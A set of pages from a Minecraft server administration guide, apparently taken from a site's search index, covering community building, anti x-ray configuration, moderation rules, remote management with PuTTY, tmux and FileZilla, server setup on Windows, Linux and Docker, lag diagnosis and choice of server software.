It keeps players connected to your server. It also makes your server a fun place. A community is not for sale, but it is worth a lot. You build a community and have to maintain a community as a true leader. We'll discuss three things in this guide: building a community, maintaining a community and some general tips. Before discussing how to build and maintain a community, it's important to understand why people become part of a community and what they are looking for there. With this basis in mind, we can then look at how you can set up a community yourself. To become an active member of a community, four things are needed: meaning, value, agency and urgency. This boils down to the following: if someone attaches meaning and value to what is done in a community (it is about the interests and it is interesting to read) and at the same time there is a sense of agency to participate in the discussions and if you can't wait until tomorrow, then you know for sure that your members will join your community. If one of these aspects is missing, you will soon see that people give up. But at the same time, safety is also very important in a good community. This safety is a very broad concept, but it boils down to keeping your members secure and to the mutual respect of the members towards each other. If this is optimal, then members will also want to go through fire to protect the community. Building a community \u00b6 Building a community is the first step. A community often comes together automatically, if you create the opportunity. Create a Discord, Teamspeak or another group and share the link with your current players. Keep in mind that you are always growing slower than you want. Especially at the beginning, because every beginning is difficult. But also know that growth is exponential: the more players you have, the greater your reach, the faster you grow! People hate taking steps, reading and thinking about registering. The more complicated your process is to register on Minecraft / Discord, the more players will drop out. For players who drop out, it is very difficult to come back. So make sure that you only let players take the most necessary steps. If you still want to collect more information about your community members, consider other options. For example, you can encourage players to complete their profile or link their Discord to their Minecraft. This is extra effective by rewarding them at the end. Remember that you don't want to just advertise everywhere. Think about your target audience and aim your ads at them. If you do not advertise to your target group, players will appear who do not fit the current or intended community. There is always quality versus quantity, you would rather have a player that gives you pleasure than 10 that only costs you effort. Maintaining your community \u00b6 A community must remain \"alive\". That means there is activity, members talk to each other, come up with ideas and do things. When a community comes to a standstill, it is very difficult to get the community going again. So always make sure that your community stays going. One of the best ways to keep members engaged is events. This can be incredibly lengthy and doesn't even have to be related to Minecraft. As long as members interact with each other To keep a community a fun place, there should be as few \"bad apples\" in your community as possible. These are members who don't want the best for the community. Think of toxic members, trolls, bullies, and so on. This is best done by showing individual members that they are responsible for their community, but at the same time, it is very difficult. And on top of that, the more members a community has, the less likely the individual will feel responsible. General tips \u00b6 Always stay nice. If you react unkindly or bluntly yourself, this is a sign to players that this is the way to communicate within your community. At the same time, it is also clear that a toxic community can never survive. At the same time, the advice is to be clear. What are the rules and where are the boundaries? Be consistent and stay above your community. A community makes your server stronger. Use your community for feedback, because you can learn from a community what your strengths are and where you can improve. Do not use your community to only send announcements. Finally, remember: it is easy to leave a server, it is much difficult to leave a community (and therefore friends).","title":"Community"},{"location":"server/guides/community/community/#community","text":"A community is key for a Minecraft server.

Setting Up \u00b6 There are two ways to set up an anti x-ray, the first one is to use Paper and enable the built-in anti x-ray option. In older versions of Minecraft, the anti x-ray config options were in the spigot config file instead of the paper config. The second option is to install Orebfuscator . It is recommended to use Paper's built-in anti x-ray over the plugin, but if that's not possible Orebfuscator is a decent alternative, it supports versions 1.9 - 1.17. If you need it for an older version you can use this Orebfuscator that supports Beta 1.7.3 - 1.13.2. If you need a fabric anti x-ray you can check one out here , it supports 1.16.5 - 1.17.1. The config is similar to Papers but in the form of a toml file type. Setting up Paper anti x-ray \u00b6 First what you want to do is download Paper on your server or any of its forks. Now run the server so it can generate its configs, open up paper.yml and find the option anti-xray . Now to enable it, change false to true . The next option we want to look at is engine-mode , this option controls how the anti x-ray works. Engine mode 1 replaces ore with stone and engine mode 2 replaces all blocks with random block data. Engine mode 2 can give players with a bad connection high ping when teleporting. For a private server engine mode 2 is recommended, and for a public survival server where anyone can join engine mode 1 is recommended. Engine mode 2 can render the game unplayable for some players depending on the servers/players location. If you want to add more blocks to be hidden with engine mode 1 you can do so by adding it to the hidden-blocks list. If you want to have more blocks hidden by random block data with engine mode 2 you can add the blocks to the replacement-blocks list. Next are a bunch of small settings you can change. If you want to change the height that anti x-ray works on, you can change the value of max-block-height , it must be a multiple of 16 to work. There is also update-radius which controls the distance in blocks from air or water that hidden-blocks are hidden by the anti x-ray, max value is 2. lava-obscures just decides if you want to obfuscate blocks next to lava. If you want to allow certain people to bypass the anti x-ray you can enable use-permission and give the player the permission paper.antixray.bypass . Now you may have noticed that the anti x-ray does not work in other worlds. That is because the anti x-ray settings are per world. To enable it in other worlds copy the anti-xray section in the config and go to the world-settings section, now type <world-name>: and paste the anti x-ray config section inside that, repeat for all worlds you want this on. You will have to change the hidden blocks list to fit the world, for example, if it's the nether you will want to add quartz_ore and nether_gold_ore to the hidden blocks list. Setting up Orebfuscator anti x-ray \u00b6 First, to set up anti x-ray with Orebfuscator you will need to download it here along with ProtocolLib . For versions previous to 1.9 use the original Orebfuscator , config options may be different to the updated version. Open the Orebfuscator config.yml found in plugins/Orebfuscator . Find the section world and make sure enabled is set to true . Now to edit the worlds that anti x-ray is enabled in with the settings we will go through soon, find worlds and to add a world to the anti x-ray add the worlds name to the list. To add new hidden blocks you can add blocks via hiddenBlocks . To randomise all blocks that shouldn't be seen by the player add blocks to the randomBlocks section, the value you set for each block is the weight the block gets which is how common it appears when a play x-rays. You can now copy, paste and edit this section for different worlds.","title":"Anti X-Ray"},{"location":"server/guides/moderation/anti_xray/#anti-x-ray","text":"In this article, you will learn how to set up anti x-ray for your Minecraft server.","title":"Anti X-Ray"},{"location":"server/guides/moderation/anti_xray/#setting-up","text":"There are two ways to set up an anti x-ray, the first one is to use Paper and enable the built-in anti x-ray option.

Everyone does it in their own way. But how efficient and good your server settings are is measurable. How well you moderate is much less measurable. Therefore, please see this part of the guide as well-intentioned advice and not as hard rules. Rules and sanctions \u00b6 Before you can decide what rules to implement, it's important to determine what kind of server you want to run. After all, a family-friendly server for children has very different rules than an anarchy server. Often you will be looking for a balance between player freedom and player safety. For most servers, a good basis to adhere to is: a player's freedom stops when other players are bothered by actions. Before the server opens \u00b6 Before your server opens, set the rules. In a small server with friends, you agree among yourselves that you will not cheat, use X-ray or other tools. In a server for larger audiences, this is often not enough. What do you do when someone deliberately tries to cause lag and where do you draw the line in the chat? One tip is to bring out the bad in yourself and think about what you don't want to have. Below is a list of actions that are prohibited on many servers: Chat Cursing/racism Spam Advertising Sharing private information Threatening players Inappropriate name/skin Game Inappropriate Buildings Griefing Anti-afk system Lagging Hacks X-ray Hacked Client Bug abuse Server Corrupt making inventories Crashing server With a server for larger audiences, you should also share the rules. Publish them on your website, put them in the spawn or give players in the lobby a book. This way the players know what is and what is not allowed on your server. This also stops the excuse: \"I didn't know this was forbidden\". Enforce and discuss \u00b6 After you have determined the rules and the server is open, you must enforce the rules. One advice is to at least make sure that different staff members are giving out the same punishments. You can also talk with the moderator team on a regular basis. Ask if the rules are still sufficient, if anything unusual has happened and maybe adjust some rules. In this way you remain flexible and grow with your community. Moderation tools \u00b6 Make it as easy as possible for moderators with good tools. CoreProtect, for example, allows you to log all player actions and fix them. Make sure you have a good plugin that keeps track of IP history; this way alt accounts can be easily identified. Furthermore you can use an anti-cheat plugin, chatfilter or inventory-backup plugin.

This tutorial is primarily for someone on a Windows system connecting to a Linux server. Command Line Access (SSH) \u00b6 Since a lot of interaction with a Minecraft server is through its command line terminal, your primary tool for interacting with your remote server will be SSH. SSH (Secure Shell) is a tool that allows you to securely connect to a remote computer. You can use it through any terminal; below is me using SSH in the default Windows CMD to connect to a server on my local network. The basic syntax for this is ssh <username>@<IP address> . It'll prompt you for a password, and then you're in. However, there are better tools for using SSH, like PuTTY. PuTTY \u00b6 PuTTY is a very well-regarded free SSH program. Here's a view of the main menu below: Don't worry, though\u2014you don't have to learn any of that. One of the best parts of PuTTY is that you can bypass having to enter your credentials, letting PuTTY take care of that for you. This is done through a shortcut with arguments. Shortcut Setup \u00b6 Find the default PuTTY shortcuts. Press the Windows key Win and search for \"putty\". Right-click on the app result, and click \"Open file location\". The default location for this is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\PuTTY (64-bit) . Copy the \"PuTTY\" shortcut, and paste it in the directory C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs . You can rename it to something recognizable by you, such as \"SSH Minecraft Server\". Open the shortcut's properties (Right-click, \"Properties\"). In \"Target\", enter this: \"C:\\Program Files\\PuTTY\\putty.exe\" -ssh <username>@<IP address> -pw <password> . Be sure to add your proper credentials. You may need to change your path to putty.exe if you have it installed in a different location. This gives PuTTY arguments to use when you start it. The arguments are the IP address/user you want to connect to, and the password to use for that user. Note that this stores your password in plaintext. If you don't want that, you can remove the -pw <password> argument, and it will prompt you to enter your password each time you run the shortcut. That's it! You now have a shortcut for PuTTY set up. You can open the shortcut by pressing the Windows key Win and searching for its name\u2014this makes it super easy to open. You can use this SSH connection to do anything on the command-line that you'd be able to do with physical keyboard, mouse, and monitor access. tmux \u00b6 tmux is an invaluable tool for a Linux server that allows you to have several processes running on different virtual windows, allowing you to switch between them. tmux lets you run your Minecraft server in the background, letting you use the Linux terminal without stopping the server. To explain better: You SSH into your server. By default, you're now in the Linux terminal. You can run a tmux command that switches you to your Minecrft server's virtual window. Here, you can interact with your Minecraft server's terminal as normal. You use a keyboard shortcut to switch back to the main Linux terminal. From here, you can interact with the Linux OS like normal. You can switch to other tmux virtual windows/processes, too, if you have other things going on. If tmux isn't installed already, you can do so with this command: sudo apt-get install tmux . You can use bash files and tmux commands to set up scripts to do all kinds of stuff to your server, but we'll go over some basic functionality now. Here's a nice low-level tmux tutorial that goes into more detail. First, you need to create a tmux virtual window, called a session. Use the cd command to switch to your Minecraft server directory. Then, run the command tmux new-session -d -s <session name> . This starts a new tmux session in your current location. The -d starts the session detached, meaning you don't automatically switch to it. -s <session name> specifies the session's name, which is used to refer to it in other commands. Now, there are a few things you can do to access the session. Attaching sessions \u00b6 Attaching \u00b6 The tmux command for attaching a session is tmux attach-session -t <session name> . When you run it, your terminal will switch from the normal Linux terminal to the tmux session's terminal. While the session is attached, any commands run will be sent to that session. For example, if you attach the session tmux attach-session -t minecraft-server , you can run the command say Hello! , and it will be sent to the Minecraft server command-line (saying \"Hello!\" as the server), not to the Linux command-line. Detaching \u00b6 To detach the tmux session, returning to the regular Linux terminal, use the keyboard shortcut Ctrl+B , then press D . Sending keys \u00b6 To send commands to the session without switching to it, use the command tmux send-keys -t <session name>.0 \"<command>\" ENTER . There's a lot to unpack in that command: You're using the tmux command send-keys to send, well, key press input to a tmux session. You're using -t <session name>.0 to specify what tmux session you're referring to. The -t argument is used in tmux commands to do this. The .0 at the end of the session name specifies the window you want to send the keys to. This tutorial doesn't use tmux windows, but they're pretty simple: you can have multiple windows in one tmux session, switching between them. \"<command>\" ENTER has the actual keys you want sent to the tmux session. A single-line command is stored in the quotation marks, and by sending the key ENTER at the end you'll cause the session to actually run the command. You should be able to repeat this syntax several times to send multiple commands, or you can run the entire tmux send-keys command several times with a different command contained each time. Here's an example of this: tmux send-keys -t minecraft-server.0 \"sh run_server.sh\" ENTER This sends the command \"sh run_server.sh\" ENTER to the tmux session minecraft-server . This will run the shell file run_server.sh , which probably starts the Minecraft server. Shortcuts \u00b6 Since tmux commands can get sort of long, I like to use Linux aliases to shorten them. These can be set up by editing the .bashrc file in your user's root directory. In the .bashrc file, add this line to the end: alias tmuxx=\"tmux attach-session -t $1\" . Save it and close it. Now, you can run the command tmuxx <session name> , and it will run the longer tmux attach-session command under the hood, attaching your session. The $1 refers to the first argument after the tmuxx command. File Management (FileZilla) \u00b6 You're going to need to be able to access the files on your Minecraft server's machine. This can be done through SFTP (Secure File Transfer Protocol) . The best way to use SFTP is with an SFTP client such as FileZilla . You can see a picture of the FileZilla UI below: Connecting \u00b6 After you've opened FileZilla, use the keyboard shortcut Ctrl+S to open the \"Site Manager\" menu, seen below: Here, you can specify the IP address and your credentials, very similar to SSH. After you've set it all up, click \"Connect\" to connect to the server using SFTP. You'll use Ctrl+S and \"Connect\" to connect to the server using SFTP from now on. Navigation \u00b6 Now, you'll be able to view two locations: Files in a local directory on your computer Files in a remote directory on the remote server You can navigate through each by entering a direct location in the text boxes above the directory viewers or by double-clicking on a directory (double-click .. to go up one directory). Transferring Files \u00b6 There are several methods for transferring files using FileZilla: Select and drag files from one side to the other to transfer all of the selected files. Double-click a file to transfer that single file. Note this behavior on a double-click; double-clicking doesn't run a file or open it in an editor. Editing Files \u00b6 You can edit a file by right-clicking and selecting \"View/Edit\". To set a default file editor, open the settings (\"Edit\" \u2192 \"Settings\" in the top-left) and set it up using your favorite text editor like I have below: Once you've finished editing the file, save it in your editor, and go back to FileZilla. You should be greeted with this prompt: By selecting \"Yes\", the edited file will be transferred to the remote server, overwriting the existing file with your changes. If \"Finished editing and delete local file\" isn't checked, you can continute to edit/save/revert changes on the local file in your editor. If you never check that box, when you close FileZilla it'll warn you that you still have a file locally: If you've finished everything you want to do, you can safely close FileZilla and the SFTP connection will be closed. Conclusion \u00b6 Hopefully, these three tools (PuTTY, tmux, FileZilla) will give you what you need to remotely manage a Minecraft server. Start small, and soon you'll have your host machine set up just the way you want.

This will all be done locally on your computer. Setting up \u00b6 The very first thing required in setting up a Minecraft server is to verify if you have all the prerequisites, be they software or hardware requirements. As for the software, an updated version of Java is highly recommended, and in some instances, required. These can be installed from Adoptium's website, and try to keep up on updating these as previously mentioned, it is sometimes required to have the latest version of Java (at the time of writing, the version is 17. You can download it from Adoptium's site . As for the hardware requirements, they are not too strict, but they restrict what type of server you'll be running. If you don't particularly care for the performance of the server with a couple of players on a vanilla server, you should be fine to skip over this section, but if you're a hardware nerd or would like to learn more on the subject, this will attempt to enlighten you. When choosing parts for a Minecraft server, one should stray away from the higher-core-count CPUs and choose something with better single-threaded performance, as that is nearly all that Minecraft will use. Memory is often one of the most popularly sought after specs in a Server box, however a good computer alone it does not make. When choosing the parts for the computer, put more effort into finding a better CPU with the amount of RAM not as an afterthought, but a second priority. Typically speaking, more memory allows for more players and more mods, but always make sure that your CPU is keeping up with the server itself before trying to throw more memory at the server, as sometimes with more memory comes worse performance due to how java is written. Once you've figured through the prerequisites, you need to find the best server jar for your requirements; along with this thread there is a part for choosing a server jar , but if you'd rather go the easy route and stick with vanilla, a popular and quite useful to get the server jars from is mcversions.net , as that contains legacy files along with newly released versions. Setup For Windows \u00b6 After downloading your server jar create a new folder. You can name it anything you want. Once you've done that, drag the server jar into the folder and rename it server so we can access it easily in the next step. Next, we need to create the file to run the server jar, you will need to enable file extensions if you haven't already. Create a new text document and name it \"run\", now open it and type java -Xmx1024M -Xms1024M -jar server.jar nogui PAUSE 1024M is how many megabytes of RAM is allocated to the server, 1024M or 2048M is good for our purpose. If you ever need to change the amount just change the values. Save the file and close your text editor, go to the file in File Explorer and right-click, rename, and highlight the file extension \"txt\" and type \"bat\". This changes it to a batch file so we can run the server jar. We are ready to run the server now! Double click the run.bat file and it should come up with a new terminal window and after a while say \"Agree to the Minecraft EULA\". Close out of the terminal window and find a file called eula.txt that was generated. Open it and change eula=false to eula=true , save it then double click run.bat again. It may take a while for all the files to generate so be patient, once it's done your server should be good to go! To join the server open Minecraft, go to multiplayer and add a new server, in the server IP add \"localhost\", click done and join your very own Minecraft server! If you would like to be able to access the server from outside your local network, you're going to have to do what's called Port Forwarding, essentially allowing traffic to flow in and out through your router through a specific port to the computer that you're running the server on. Keep in mind this varies from ISP to ISP and from router to router, so a good guide dependent on your router is here . By default you're going to want to port forward the port 25565 for both the TCP and UDP protocols. To check whether the port forward fully worked, we recommend heading over to this website while your minecraft server is open (preferably after a restart post port forwarding), plug in the port you'd like to check, and if it says open you're good! If not, there might be something you're going to have to redo along the process. Another reason a port forward might have failed is the windows firewall. To configure this, navigate to the windows defender control panel screen, and head over into advanced settings (you will need admin to do this). Go into inbound rules and outbound rules, and create a new rule for each, name it whatever you like, and make sure that it is allowing the port 25565 on BOTH TCP and UDP (you might need to set up 2 rules for each side). Once that is done, windows should no longer block a server running on that port on your machine. Note: some ISPs have built in security functions in the router itself (looking at you xFinity), and as such they may block people from connecting to the server. While we do not recommend turning off a security function for the everyday user, in some instances it is required. This process is slightly different for a modded server so we will go over it here! Setup For Linux \u00b6 Warning You should prefer using your package manager (for example apt on Ubuntu and Debian) to install Java because it's more organized and easier to keep up-to-date Depending on the Minecraft version you want to install, you'll need a specific Java version. Java 8 - 14 for versions 1.8 - 1.16 At least Java 16 for versions 1.17 or later It is recommended to use an LTS version of Java. This would be Java 11 below 1.16 and Java 17 for 1.17 or later You can do this using the following command (If your distro does not use apt, consult the wiki of your distro, for example: Fedora , Arch (and Arch-based) ) sudo apt install openjdk-xx-jre xx being the version number you're aiming for. (You can view available versions using sudo apt-cache search openjdk ) Create a folder, for example named \"server\", for example in your home directory ( ~ ) and cd into it. mkdir ~/server cd server Download the latest version of your preferred server software, i.e. Paper. Attention Make sure to change the download URL! You can copy the direct download URL from the downloads page of your server software. wget -O server.jar https://papermc.io/api/v2/projects/paper/versions/1.17.1/builds/400/downloads/paper-1.17.1-400.jar Create a text document named start.sh and write into it: How can I create a text file? You can create a text document with nano for example: nano start.sh Use Ctrl + O to save and Ctrl + X to exit. start.sh java -Xmx1024M -jar server.jar nogui # (1) nogui is not required but recommended. Without it, a graphical interface will be launched. You don't really need that. -Xmx1024M being the parameter for the Java heap size in megabytes (1024 MB = 1 GiB). As your server grows in amount of plugins and concurrent players, you may want to increase this. Info If you have multiple versions of java installed, you may need to provide the full path to the java executable. Usually, they will be installed in /usr/lib/jvm . echo \"java -Xmx1024M -jar server.jar nogui\" > start.sh Now add execute permissions to the script and run it chmod +x start.sh ./start.sh This will say something like You need to agree to the EULA in order to run the server. Go to eula.txt for more info. so you have to edit eula.txt to say eula=true instead of eula=false echo \"eula=true\" > eula.txt Warning This overwrites the comment with the link to the EULA! Now launch the server by executing start.sh again. ./start.sh You have your server running! To join, launch Minecraft and join the server at 127.0.0.1 or localhost If you want to start the server and want to be able to exit out of the terminal without the server closing, there are three ways with which you can do this You can use a utility called tmux . Use this if the server is intended to be temporarily up. You can also use screen this serves the same as tmux. You can register minecraft as a system unit . Use this if the server is intended to be up 24/7 and requires automatic restarting in case of host shutdowns/failures. Setup With Tmux \u00b6 Start a tmux window tmux new-session -t sessionName sessionName being whatever you want to name the instance, for example minecraft-session This will automatically take you inside the tmux session. Start the server using java -Xmx1024M -Xms1024M -jar server.jar nogui Exit out of the tmux session using Ctrl + B then D Your server will keep running in the background. To reattach to the session: tmux a -t sessionName sessionName being whatever you named the instance earlier. To destroy the session completely, you can attach to the session and then Ctrl + D out of it. It detaches from session and destroys it too. Setup With Screen \u00b6 Start a screen session screen -S sessionName sessionName being whatever you want to name the instance, for example minecraft-session This will automatically take you inside the screen session. Start the server using the startup script mentioned above, or use java -Xmx1024M -Xms1024M -jar server.jar nogui Exit out of the screen session using Ctrl + A then D Your server will keep running in the background. To reattach to the session: screen -r sessionName sessionName being whatever you named the instance earlier. To destroy the session completely, you can attach to the session and then Ctrl + A then K and press Enter . Setup As A System Service \u00b6 You need to set up a service if it should, for example, automatically launch at boot or restart when it terminates. To achieve this, create a file named minecraft.service in /etc/systemd/system (requires root permissions) and write into it: /etc/systemd/system/minecraft.service [Unit] Description = A Minecraft Server After = network.target StartLimitIntervalSec = 0[Service] Type = simple Restart = always RestartSec = 1 User = {YOURUSERNAME} ExecStart = /home/{YOURUSERNAME}/server/start.sh Note Of course, replace {YOURUSERNAME} with your username on the system, in order for it to not start with root permissions, which is a bad idea. sudo echo \"[Unit]\\nDescription=A Minecraft Server\\nAfter=network.target\\nStartLimitIntervalSec=0[Service]\\nType=simple\\nRestart=alwaysRestartSec=1\\nUser= $USER \\nExecStart= $HOME /server/start.sh\" > /etc/systemd/system/minecraft.service Now you can start the service. systemctl start minecraft Now you should be able to join. It will restart automatically 1 second after it shut down. To make it start at boot, enable it: systemctl enable minecraft Setup For Docker \u00b6 Prebuilt Docker \u00b6 Based on the docker image with the most pulls See itzg/docker-minecraft-server for more details Simple Launch \u00b6 docker run -d -p 25565 :25565 --name mc -e EULA = TRUE itzg/minecraft-server Docker Compose \u00b6 docker-compose.yml version : \"3\" services : mc : image : itzg/minecraft-server ports : - 25565:25565 environment : EULA : \"TRUE\" volumes : # attach the relative directory 'data' to the container's /data path ./data:/data Build it Yourself \u00b6 You can use an already built docker image or just create a Dockerfile, in your server folder, with following content: DOCKERFILE FROM openjdk WORKDIR /data COPY [ \"server.jar\" , \"eula.txt\" , \"start.sh\" ] ./ EXPOSE 25565 ENTRYPOINT [ \"/data/start.sh\" ] Now, supposing you have docker installed, build the docker image docker build . -t mcserver Tip You can replace mcserver , the name of the image, with whatever you want (as long as it doesn't interfere with the images on dockerhub) Run the docker image docker run --name mcserver -p 25565 :25565 -d --restart unless-stopped mcserver Or with docker compose, write following in a file named docker-compose.yml docker-compose.yml version : \"3\" services : mcserver : build : . restart : unless stopped ports : - 25565:25565 volumes : -./server:/root and run it docker-compose up -d","title":"Minecraft Server Setup"},{"location":"server/guides/setup/minecraft_setup/#minecraft-server-setup","text":"This article aims to give you directions on how you can run and join your Minecraft server.

Once you've figured through the prerequisites, you need to find the best server jar for your requirements; along with this thread there is a part for choosing a server jar , but if you'd rather go the easy route and stick with vanilla, a popular and quite useful to get the server jars from is mcversions.net , as that contains legacy files along with newly released versions.","title":"Setting up"},{"location":"server/guides/setup/minecraft_setup/#setup-for-windows","text":"After downloading your server jar create a new folder. You can name it anything you want. Once you've done that, drag the server jar into the folder and rename it server so we can access it easily in the next step. Next, we need to create the file to run the server jar, you will need to enable file extensions if you haven't already. Create a new text document and name it \"run\", now open it and type java -Xmx1024M -Xms1024M -jar server.jar nogui PAUSE 1024M is how many megabytes of RAM is allocated to the server, 1024M or 2048M is good for our purpose. If you ever need to change the amount just change the values. Save the file and close your text editor, go to the file in File Explorer and right-click, rename, and highlight the file extension \"txt\" and type \"bat\". This changes it to a batch file so we can run the server jar. We are ready to run the server now! Double click the run.bat file and it should come up with a new terminal window and after a while say \"Agree to the Minecraft EULA\". Close out of the terminal window and find a file called eula.txt that was generated. Open it and change eula=false to eula=true , save it then double click run.bat again. It may take a while for all the files to generate so be patient, once it's done your server should be good to go! To join the server open Minecraft, go to multiplayer and add a new server, in the server IP add \"localhost\", click done and join your very own Minecraft server! If you would like to be able to access the server from outside your local network, you're going to have to do what's called Port Forwarding, essentially allowing traffic to flow in and out through your router through a specific port to the computer that you're running the server on. Keep in mind this varies from ISP to ISP and from router to router, so a good guide dependent on your router is here . By default you're going to want to port forward the port 25565 for both the TCP and UDP protocols. To check whether the port forward fully worked, we recommend heading over to this website while your minecraft server is open (preferably after a restart post port forwarding), plug in the port you'd like to check, and if it says open you're good! If not, there might be something you're going to have to redo along the process. Another reason a port forward might have failed is the windows firewall. To configure this, navigate to the windows defender control panel screen, and head over into advanced settings (you will need admin to do this). Go into inbound rules and outbound rules, and create a new rule for each, name it whatever you like, and make sure that it is allowing the port 25565 on BOTH TCP and UDP (you might need to set up 2 rules for each side). Once that is done, windows should no longer block a server running on that port on your machine. Note: some ISPs have built in security functions in the router itself (looking at you xFinity), and as such they may block people from connecting to the server. While we do not recommend turning off a security function for the everyday user, in some instances it is required. This process is slightly different for a modded server so we will go over it here!","title":"Setup For Windows"},{"location":"server/guides/setup/minecraft_setup/#setup-for-linux","text":"Warning You should prefer using your package manager (for example apt on Ubuntu and Debian) to install Java because it's more organized and easier to keep up-to-date Depending on the Minecraft version you want to install, you'll need a specific Java version.

Credit Huge credit to this guide by YouHaveTrouble for parts of this guide. Different kinds of Lag \u00b6 TPS - Server Lag \u00b6 TPS stands for T icks P er S econd. It is also the only lag type a server owner has direct control over. A server processes all tasks at a rate of 20 TPS. Tasks like mob movement, crop growth, and player interactions with blocks need to be ticked by the server to function properly. A TPS below 20 means the server is running behind and must skip tasks in order to keep important tasks on time. Significant TPS loss usually presents itself with minor annoyances like intermittent mob freezing and block break resets. Severe cases could result in server-wide freezes or even crashes. TPS Ratings \u00b6 TPS Rating Description 20.0 Flawless Well done. 19.95 - 19.99 Great Unnoticeable TPS loss. Most servers live here. 18.5 - 19.94 Fair Maybe some annoyances, but nothing game-ruining. 16.0 - 18.4 Poor You definitely need to fix it if this is your average. < 16.0 Unplayable... Ping - Connection Lag \u00b6 Ping (aka latency) reflects how long (in milliseconds) data takes to process and travel between the client and server host. The further a client is geographically separated from the server, the longer this transfer might take. Other common influences on ping are congested or slow connections. As a server owner (assuming you have a choice) you should host your server in a region where you prefer to have your player base or one that appeases a broad range of players. Attention As a player, you can't really do anything about your ping. Any program or tool claiming to get you a better ping is probably some malware. Ping Ratings \u00b6 Ping (ms) Rating Description 1 - 90 Great! 91 - 179 Good Maybe a slight disadvantage in PvP. 180 - 299 Poor Regular lag while interacting with blocks/players/entities. 300 - 499 Bad Nearly unplayable. > 500 Unplayable... Assuming your bandwidth is solid, it's time to find a server closer to you. FPS - Client Lag \u00b6 Do not confuse TPS with FPS ( F rames P er S econd). FPS reflects a client's ability to process and display what the game/server wants to render. FPS is 100% client side and has nothing to do with server performance. The only thing a server can do to help FPS is cut server features so dinosaur PCs can keep up, but even that is unlikely to make a big difference. Instead of reducing server features, recommend a popular client mod called Optifine to players. For newer Minecraft versions, Sodium would also be a good choice. FPS Ratings \u00b6 Note These rates assume your standing average in a non-graphic-intense location. FPS Rating Description > 60 Perfect Cool! 40 - 59 Great Should have no issues. 25 - 39 Good Occasional rendering lags. Issues if you enter graphic-intense areas. 15 - 24 Poor Constant rendering glitches. Probably freeze in graphic-intense areas. 0 - 10 Bad You should significantly reduce your graphic settings. Tip: FPS capping If you have more FPS than your your monitor can display, consider capping the FPS to a little bit over your monitors refresh rate (Hz) in order to avoid unnecessary stress on your hardware. Tip: Reduce graphic settings. In order to get more FPS out of your machine, you should consider reducing your graphic settings. Tinker around with them and try to find the optimal values. What's lagging? - measuring performance \u00b6 mspt \u00b6 Paper offers a /mspt command that will tell you how much time the server took to calculate recent ticks. If the first and second value you see are lower than 50, then congratulations! Your server is not lagging! If the third value is over 50 then it means there was at least 1 tick that took longer. That's completely normal and happens from time to time, so don't panic. timings \u00b6 A great way to see what might be going on when your server is lagging are timings. Timings is a tool that lets you see exactly what tasks are taking the longest. It's the most basic troubleshooting tool and if you ask for help regarding lag you will most likely be asked for your timings. Using timings \u00b6 Run /timings start to start capturing the timings. Let your server run normally for a few minutes. Run /timings paste to stop capturing and open the link provided to view the timings graphically. You can also share this link with people asking for it when you're asking for help regarding lags. Tip For more information about timings and how to read them, take a look at the wiki page or this detailed video tutorial by Aikar ; spark \u00b6 Spark is a plugin that allows you to profile your servers CPU and memory usage. You can read on how to use it on its wiki . There's also a guide on how to find the cause of lag spikes here . Optimizing your server software specific configurations to your needs \u00b6 Every server software has its own set of configurations that you can tweak to suit your specific needs. You probably wont find them as effective as the config of a minigames server in a survival server. You should read every config, understand it and choose if you need to use it or not. Caution Bad configurations can ruin the game experience, be especially careful with survival servers. Some values can ruin your mob spawning rates or destroy your players custom redstone circuits.\\ It is important for you to understand the configuration changes you are applying to your server. Don't just copy everything from the internet. Here is a guide made by a well-known member of the community that can help you further in this optimization, it is limited to PaperMC and doesn't have optimized configs for Tuinity, Purpur or any other forks. You can also join this discord , which has an amazing Discord bot that assists you optimizing your server based on your timings report! Remember this is a general suggestion, it may not suit your needs. Aikars Flags / Startup Flags \u00b6 You should also use correct startup flags, the Aikars flags ! Sadly many server hosts won't allow you to edit startup flags by yourself, but they are likely to do it for you if you open a ticket. World Pre-Generation \u00b6 Another essential step in survival servers is to pre-generate your world, because chunk generation consumes a lot of resources. One of several possible ways is shown below Download and install Fast Chunk Pregenerator Set your desired world limit. Use the command: /fcp start <radius> [world] [chunkX] [chunkZ] Wait for it to finish, it may take a long time and the server will lag while it works. This MUST be done with the server empty / closed to public. \"Too good to be true\" plugins \u00b6 Plugins removing ground items \u00b6 Absolutely unnecessary since they can be replaced with merge radius and alt-item-despawn-rate and frankly, they're less configurable than basic server configs. They tend to use more resources scanning and removing items than not removing the items at all. Mob stacker plugins \u00b6 It's really hard to justify using one. Stacking naturally spawned entities causes more lag than not stacking them at all due to the server constantly trying to spawn more mobs. The only \"acceptable\" use case is for spawners on servers with a large amount of spawners. Plugins enabling/disabling other plugins \u00b6 Danger Anything that enables or disables plugins on runtime is extremely dangerous. Loading a plugin like that can cause fatal errors with tracking data and disabling a plugin can lead to errors due to removing dependency.

Server software contains all the code for the server, there are some for modloaders, like Forge or Fabric , and some that allow you to use plugins, like Sponge or SpigotMC . Here is a list with lots of server software in one place. Picking your server software \u00b6 The first step to deciding what server software you want to use is picking what type of server you want to run. If you already know, great! If not you should go and decide before reading further. Now you need to think about what features your server needs, like chests, combat, redstone etc. If your server doesn't need many vanilla features you may want to look into using a server software built from the ground up, like Minestom or Krypton . The vanilla server will work for whatever you decide but will not have the performance compared to software without all the features. Vanilla Software \u00b6 If you need the vanilla software's features, trying to decide between a server software for a vanilla server is hard, there are many forks claiming to be the best. If you don't need any plugins on your server you can use a Fabric server with server-side optimization mods. The most commonly used vanilla software with plugin support is SpigotMC and its forks, PaperMC , Purpur etc. Another popular vanilla software with plugin support is SpongeVanilla , its primary use is in forge-spigot hybrid servers, in the form of SpongeForge , but it can be used with just vanilla. The SpongeAPI doesn't have as big of a variety of plugins created for it as SpigotMC so you might need to create some of the plugins yourself. There is server software that is designed/optimized for faction/KitPVP or some other types of gamemodes but many are mass-produced and are abandoned quickly. Custom Software \u00b6 Custom software is created for better performance mainly targetting minigame servers. Some are trying to recreate the vanilla server with better performance and others are just an API and you need to recode every feature you want in the game. These are mostly good for minigame servers as the vanilla recodes are likely not finished. Modded Software \u00b6 If you want to play with mods you will need a modded server software. There are a few of these but the most popular/still updated ones are Fabric and Forge . There are mod versions of plugins but not as much of a wide variety, hybrid servers (explained below) are better for this. Fabric is more commonly used for servers with mods that act as plugins. Hybrid Software \u00b6 If you are running a hybrid server, mods and plugins, there are a few options. If you are looking for a hybrid server that supports Bukkit plugins it will be less stable than one that is built over the mod software as it mashes two different server software together and plugins may be incompatible with 